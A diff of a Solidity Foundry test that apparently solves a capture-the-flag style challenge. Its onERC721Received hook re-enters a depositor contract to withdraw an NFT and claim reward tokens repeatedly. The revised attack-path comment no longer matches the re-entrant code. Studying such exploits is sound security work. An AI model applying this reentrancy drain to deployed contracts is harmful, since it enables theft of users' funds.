@@ -24,11 +24,9 @@ contract RewardTokenAttack is Test, IERC721Receiver {
 
     // Attack Path:
     // 1. tranfer nft 42 to the depositoor
-    // 2. call withdrawAndClaimEarnings 
-    // 3. inside onERC721Received method if rewardToken has balance:
-    // 3.1 transfer the nft 42 back to the depositor so that you can withdraw it and accrue profit
-    // 3.2 withdraw the nft and claim earnings
-    
+    // 2. increment block.timestamp to accrue maximum reward
+    // 3. withdraw and claim rewards
+
     function testAttack() public {
         nft.safeTransferFrom(address(this), address(depositor), 42);
         vm.warp(block.timestamp + 20 days);
@@ -37,7 +35,11 @@ contract RewardTokenAttack is Test, IERC721Receiver {
         assertEq(rewardToken.balanceOf(address(this)), 100e18);
     }
 
-    function onERC721Received(address, address from, uint256 tokenId, bytes calldata) external override returns (bytes4){
+    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
+        external
+        override
+        returns (bytes4)
+    {
         if (rewardToken.balanceOf(address(depositor)) > 0) {
             nft.transferFrom(address(this), address(depositor), 42);
             depositor.withdrawAndClaimEarnings(42);
